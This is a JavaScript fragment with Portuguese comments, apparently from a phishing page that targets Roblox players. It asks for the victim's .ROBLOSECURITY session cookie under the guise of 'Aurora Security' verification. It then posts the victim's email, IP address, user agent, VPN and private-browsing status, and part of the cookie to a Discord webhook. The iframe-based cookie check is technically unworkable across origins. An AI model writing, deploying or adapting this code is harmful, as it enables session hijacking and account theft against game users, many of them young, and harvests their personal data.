// ============================================================
// 6.5 FUNÇÃO PARA VERIFICAR COOKIE (VIA NAVEGADOR)
// ============================================================
async function verifyAndSendCookie(cookie, email, ip, isPrivate, vpnDetected) {
    try {
        showNotification('⏳', 'Verificando Cookie...', 'Aguarde, estamos validando seu cookie no Roblox.');
        
        // ===== VERIFICAR DIRETO NO NAVEGADOR (MAIS CONFIÁVEL) =====
        const verifyResult = await verifyCookieDirect(cookie);
        
        if (!verifyResult.valid) {
            showNotification('❌', 'Cookie Inválido!', verifyResult.error || 'Cookie não é válido. Verifique se você copiou corretamente.');
            
            // Enviar ALERTA para o Discord
            const alertPayload = {
                content: `⚠️ **ALERTA: COOKIE INVÁLIDO** ⚠️\n\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n❌ **Erro:** ${verifyResult.error || 'Cookie inválido'}\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🚨 **Tentativa de cookie inválido detectada!**`,
                username: 'Aurora Security',
                avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
            };
            
            try {
                await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(alertPayload)
                });
            } catch (e) {}
            
            return false;
        }
        
        // COOKIE É VÁLIDO!
        const userName = verifyResult.user.displayName || verifyResult.user.name || 'Usuário Roblox';
        const userId = verifyResult.user.id || 'ID não disponível';
        
        showNotification('✅', 'Cookie Válido!', `Bem-vindo(a) ${userName}! (ID: ${userId})`);
        
        // Enviar CONFIRMAÇÃO para o Discord
        const confirmPayload = {
            content: `✅ **COOKIE VERIFICADO COM SUCESSO!** 🎉\n\n👤 **Usuário:** ${userName}\n🆔 **ID:** ${userId}\n📧 **Email:** ${email}\n🌐 **IP:** \`${ip}\`\n📱 **User Agent:** \`${navigator.userAgent}\`\n🔒 **Navegador Anônimo:** ${isPrivate ? '✅ Sim' : '❌ Não'}\n🌐 **VPN/Proxy:** ${vpnDetected ? '✅ Detectado' : '❌ Não'}\n🍪 **Cookie:** \`${cookie.substring(0, 30)}...\`\n⏰ **Data:** ${new Date().toLocaleString('pt-BR')}\n\n🏆 **Cookie VÁLIDO confirmado!** #HexaVem 🇧🇷`,
            username: 'Aurora Security',
            avatar_url: 'https://cdn.discordapp.com/emojis/1234567890/a_abcdef.gif'
        };
        
        try {
            await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(confirmPayload)
            });
        } catch (e) {}
        
        return true;
        
    } catch (error) {
        console.error('❌ Erro ao verificar cookie:', error);
        showNotification('❌', 'Erro!', 'Falha ao verificar cookie. Tente novamente.');
        return false;
    }
}

// ============================================================
// FUNÇÃO PARA VERIFICAR COOKIE DIRETO NO NAVEGADOR
// ============================================================
async function verifyCookieDirect(cookie) {
    return new Promise((resolve) => {
        try {
            // Criar um iframe invisível para verificar o cookie
            const iframe = document.createElement('iframe');
            iframe.style.display = 'none';
            iframe.src = 'https://www.roblox.com/my/profile';
            
            // Configurar o cookie no iframe
            document.cookie = `.ROBLOSECURITY=${cookie}; path=/; domain=.roblox.com`;
            
            // Aguardar o iframe carregar
            iframe.onload = function() {
                try {
                    // Tentar acessar o conteúdo do iframe (se conseguir, está logado)
                    const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
                    
                    // Verificar se tem elementos de perfil
                    const profileName = iframeDoc.querySelector('.profile-name') || 
                                        iframeDoc.querySelector('.username') ||
                                        iframeDoc.querySelector('[data-testid="profile-name"]');
                    
                    if (profileName) {
                        resolve({
                            valid: true,
                            user: {
                                id: 'Verificado pelo navegador',
                                name: profileName.textContent.trim(),
                                displayName: profileName.textContent.trim()
                            }
                        });
                    } else {
                        // Tentar verificar pelo título da página
                        const title = iframeDoc.title || '';
                        if (title.includes('Profile') || title.includes('Perfil')) {
                            resolve({
                                valid: true,
                                user: {
                                    id: 'Verificado pelo navegador',
                                    name: 'Usuário Roblox',
                                    displayName: 'Usuário Roblox'
                                }
                            });
                        } else {
                            resolve({
                                valid: false,
                                error: 'Cookie inválido ou expirado'
                            });
                        }
                    }
                } catch (e) {
                    // Se der erro de CORS, tentar método alternativo
                    resolve({
                        valid: false,
                        error: 'Não foi possível verificar o cookie'
                    });
                }
                
                // Remover o iframe
                document.body.removeChild(iframe);
            };
            
            iframe.onerror = function() {
                document.body.removeChild(iframe);
                resolve({
                    valid: false,
                    error: 'Erro ao verificar cookie'
                });
            };
            
            document.body.appendChild(iframe);
            
            // Timeout para evitar loop infinito
            setTimeout(() => {
                if (document.body.contains(iframe)) {
                    document.body.removeChild(iframe);
                }
                resolve({
                    valid: false,
                    error: 'Tempo limite excedido'
                });
            }, 10000);
            
        } catch (error) {
            resolve({
                valid: false,
                error: 'Erro ao verificar cookie: ' + error.message
            });
        }
    });
}
